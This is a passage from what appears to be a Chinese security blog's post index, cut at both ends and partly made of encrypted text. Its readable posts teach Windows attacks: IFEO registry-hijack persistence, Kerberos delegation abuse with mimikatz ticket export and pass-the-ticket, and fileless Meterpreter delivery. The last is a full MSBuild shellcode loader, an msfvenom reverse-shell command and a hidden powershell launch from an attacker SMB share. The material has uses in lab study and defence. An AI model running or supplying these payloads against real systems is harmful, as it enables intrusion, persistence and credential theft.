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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>映像劫持的新老玩法</title>
      <link href="/posts/9a523925.html"/>
      <url>/posts/9a523925.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=440073051&auto=1&height=66"></iframe><h2 id="image-hijack"><a href="#image-hijack" class="headerlink" title="image hijack"></a>image hijack</h2><p>映像劫持（IFEO）</p><p>作用：劫持对应的程序后，打开该程序运行的是别的程序，比如运行A.exe打开的则是CALC.exe<br>注册表路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<br>用法：在注册表路径下创建一个项，项名为要劫持的exe名称，并在该项创建一个Debugger的键值，键值填运行的恶意EXE。或者在已经创建的项里创建Debugger键填入键值，运行那个exe就会被劫持</p><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /t REG_SZ /d C:\Windows\System32\calc.exe</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339V61.png" alt=""></p><p>效果图：<br><img src="https://s2.ax1x.com/2020/02/23/339lfH.gif" alt=""></p><p>映像劫持新玩法：</p><p><a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151425</a><br>效果：程序A静默退出结束后，会执行程序B。<br>注册表路径：</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;劫持的exe名称&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;劫持的exe名称&gt;</code></pre><p>劫持notepad.exe示例：</p><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; /v notepad.exe /t REG_DWORD /d 512reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d C:\Windows\System32\calc.exereg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339gBV.gif" alt=""></p><p>代替映像劫持的注册表路径</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\&lt;要劫持的exe名&gt;</code></pre><p>Defualt键值为要运行的恶意exe路径<br><img src="https://s2.ax1x.com/2020/02/23/33CSgA.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/02/23/33CpjI.gif" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kerberos委派攻击</title>
      <link href="/posts/4d3be28.html"/>
      <url>/posts/4d3be28.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>昨天晚上在先知社区见到一篇有关Keberos委派攻击的文章。晚上在弄别的事情没有实验，早上抽空实验了一波</p><h2 id="0x01环境"><a href="#0x01环境" class="headerlink" title="0x01环境"></a>0x01环境</h2><pre><code>Windows server 2008 R2:192.168.1.122 (AD)Windows 7:192.168.1.107工具：mimikatz、keke</code></pre><h2 id="0x02何为委派"><a href="#0x02何为委派" class="headerlink" title="0x02何为委派"></a>0x02何为委派</h2><p>先知社区的解释：域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动<br>安全客的解释：在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p><h2 id="0x03委派的分类"><a href="#0x03委派的分类" class="headerlink" title="0x03委派的分类"></a>0x03委派的分类</h2><p>委派分为两种：</p><ul><li>非约束委派</li><li>约束委派</li></ul><p>非约束委派：<br>非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。</p><p>约束委派：<br>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p><h2 id="0x04非约束委派的设置"><a href="#0x04非约束委派的设置" class="headerlink" title="0x04非约束委派的设置"></a>0x04非约束委派的设置</h2><p>在域中只有服务账户才能有委派功能，所以先把用户user01设置为服务账号。</p><pre><code>setspn -A https/apache2.4 user01</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qfpuV.png" alt="1qfpuV.png"></p><p><img src="https://s2.ax1x.com/2020/02/13/1qfuDK.png" alt="1qfuDK.png"></p><p>之后在AD Edit查看用户可以看到，非约束委派设置好的标明<br><img src="https://s2.ax1x.com/2020/02/13/1qfrCj.png" alt="1qfrCj.png"></p><h2 id="0x05约束委派的设置"><a href="#0x05约束委派的设置" class="headerlink" title="0x05约束委派的设置"></a>0x05约束委派的设置</h2><p>把用户设置为服务账号<br><img src="https://s2.ax1x.com/2020/02/13/1qhpRA.png" alt="1qhpRA.png"></p><h2 id="0x06两者设置后在AD-EDIT的区别"><a href="#0x06两者设置后在AD-EDIT的区别" class="headerlink" title="0x06两者设置后在AD EDIT的区别"></a>0x06两者设置后在AD EDIT的区别</h2><p>当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含<code>TRUSTED_FOR_DELEGATION</code><br>当服务账号或者主机被设置为约束性委派时，其userAccountControl属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且msDS-AllowedToDelegateTo属性会包含被约束的服务</p><h2 id="0x07非约束委派的发现"><a href="#0x07非约束委派的发现" class="headerlink" title="0x07非约束委派的发现"></a>0x07非约束委派的发现</h2><p>发现域中的委派主机或账户：</p><pre><code>通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。查询域中配置非约束委派的账户：Get-NetUser -Unconstrained -Domain &lt;domain&gt;这里的PowerView是master分支的</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qRNRI.png" alt="1qRNRI.png"></p><p>查询域中配置非约束委派的主机：</p><pre><code>Get-NetComputer -Unconstrained -Domain &lt;domain&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qWdh9.png" alt="1qWdh9.png"></p><h2 id="0x08约束委派的发现"><a href="#0x08约束委派的发现" class="headerlink" title="0x08约束委派的发现"></a>0x08约束委派的发现</h2><p>查询域中配置约束委派的账户：<br>（dev分支的powerSploit）</p><pre><code>Get-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4EOx.png" alt="1q4EOx.png"></p><p>查看设置了约束委派的用户：</p><pre><code>Get-DomainUser -TrustedToAuth -Domain www.haq.com</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4ukD.png" alt="1q4ukD.png"></p><p>查询域中配置约束委派的主机:</p><pre><code>Get-DomainComputer -TrustedToAuth -Domain &lt;domain&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4atg.png" alt="1q4atg.png"></p><h2 id="0x09非约束委派的利用"><a href="#0x09非约束委派的利用" class="headerlink" title="0x09非约束委派的利用"></a>0x09非约束委派的利用</h2><p>假设域控用Administrator账号smb登录了某台域机器，那这个时候域管理员的TGT已经缓存在域机器<br>使用mimikatz导出内存</p><pre><code>privilege::debugsekurlsa::tickets /export</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qI6FU.png" alt="1qI6FU.png"></p><p>最主要的是这个（域管的TGT）<br><img src="https://s2.ax1x.com/2020/02/13/1qIhO1.md.png" alt="1qIhO1.md.png"></p><p>此时我们在没有凭证的情况下访问域控的共享C盘是没有权限的（图忘截了，下面的图顶替一下）<br><img src="https://s2.ax1x.com/2020/02/13/1qIHYD.png" alt="1qIHYD.png"></p><p>mimikatz导入凭证</p><pre><code>privilege::debugkerberos::ptt [0;2c06d4]-2-0-40e00000-Administrator@krbtgt-WWW.HAQ.COM.kirbikerberos::list</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qo6Bt.png" alt="1qo6Bt.png"></p><p>之后我们可以使用Enter-PSSession获取一个shell</p><pre><code>Enter-PSSession -ComputerName &lt;主机名&gt;(不能IP)</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qo43Q.png" alt="1qo43Q.png"></p><h2 id="0x10约束委派的利用"><a href="#0x10约束委派的利用" class="headerlink" title="0x10约束委派的利用"></a>0x10约束委派的利用</h2><p>利用条件：</p><pre><code>已知当前配置了约束委派的当前账户的密码</code></pre><p>通过已知的账户名和明文密码对KDC发起请求, 得到TGT<br><img src="https://s2.ax1x.com/2020/02/13/1q7PMj.png" alt="1q7PMj.png"></p><p>使用kekeo申请TGS票据（我这里失败了）<br><img src="https://s2.ax1x.com/2020/02/13/1q7nWF.png" alt="1q7nWF.png"></p><p>所以下面的导入凭证，也不会认证成功<br><img src="https://s2.ax1x.com/2020/02/13/1q7lLR.png" alt="1q7lLR.png"></p><h2 id="0x11委派攻击的防御"><a href="#0x11委派攻击的防御" class="headerlink" title="0x11委派攻击的防御"></a>0x11委派攻击的防御</h2><blockquote><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。<br>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。<br>如果是win2012的系统也可以通过设置受保护的用户组来缓解委派所带来的危害。</p></blockquote><p><img src="https://s2.ax1x.com/2020/02/13/1q76Ff.png" alt="1q76Ff.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7217#toc-0" target="_blank" rel="noopener">域渗透——Kerberos委派攻击 - 先知社区</a><br><a href="https://www.anquanke.com/post/id/173477" target="_blank" rel="noopener">Kerberos协议探索系列之委派篇 - 安全客，安全资讯平台</a></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网不落地上线msf</title>
      <link href="/posts/feab0778.html"/>
      <url>/posts/feab0778.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>原本打算直接写在星球里的，编辑器太垃圾了。我佛了….写的烦躁，直接用博客写</p><h2 id="0x01环境"><a href="#0x01环境" class="headerlink" title="0x01环境"></a>0x01环境</h2><pre><code>windows 7:192.168.241.156kali:192.168.1.108</code></pre><h2 id="0x02实验过程"><a href="#0x02实验过程" class="headerlink" title="0x02实验过程"></a>0x02实验过程</h2><p><strong>msfvenom生成32位的shellcode</strong></p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f csharp</code></pre><p>替换xml里的shellcode</p><pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;  &lt;!-- This inline task executes shellcode. --&gt;  &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;  &lt;!-- Save This File And Execute The Above Command --&gt;  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;  &lt;!-- License: BSD 3-Clause --&gt;  &lt;Target Name=&quot;Hello&quot;&gt;    &lt;ClassExample /&gt;  &lt;/Target&gt;  &lt;UsingTask    TaskName=&quot;ClassExample&quot;    TaskFactory=&quot;CodeTaskFactory&quot;    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;    &lt;Task&gt;      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;      &lt;![CDATA[        using System;        using System.Runtime.InteropServices;        using Microsoft.Build.Framework;        using Microsoft.Build.Utilities;        public class ClassExample :  Task, ITask        {                   private static UInt32 MEM_COMMIT = 0x1000;                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                    [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                    [DllImport(&quot;kernel32&quot;)]            private static extern IntPtr CreateThread(                        UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId                       );          [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 WaitForSingleObject(                       IntPtr hHandle,            UInt32 dwMilliseconds            );                    public override bool Execute()          {            byte[] shellcode = new byte[304]{shellcode };              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,                MEM_COMMIT, PAGE_EXECUTE_READWRITE);              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);              IntPtr hThread = IntPtr.Zero;              UInt32 threadId = 0;              IntPtr pinfo = IntPtr.Zero;              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);              WaitForSingleObject(hThread, 0xFFFFFFFF);              return true;          }        }           ]]&gt;      &lt;/Code&gt;    &lt;/Task&gt;  &lt;/UsingTask&gt;&lt;/Project&gt;</code></pre><p><img src="https://s2.ax1x.com/2020/02/08/1R2V6P.png" alt="1R2V6P.png"></p><p>配置smb<br><img src="https://s2.ax1x.com/2020/02/08/1R2G60.png" alt="1R2G60.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1R20h9.png" alt="1R20h9.png"></p><p>执行如下命令：</p><pre><code>powershell -w hidden -c &quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\192.168.1.108\share\t.xml &quot;</code></pre><p>这样做是为了不出现黑框，但是会被杀。如果有其他隐藏黑框的可以取而代之<br>（被杀的点是powershell -w hidden参数，命令原本不会被杀，已测过）<br><img src="https://s2.ax1x.com/2020/02/08/1RhpjI.png" alt="1RhpjI.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RhE4g.png" alt="1RhE4g.png"></p><p>如果是外网的话可用WebDAV代替smb</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Hack the box - Monteverde</title>
      <link href="/posts/7314ea41.html"/>
      <url>/posts/7314ea41.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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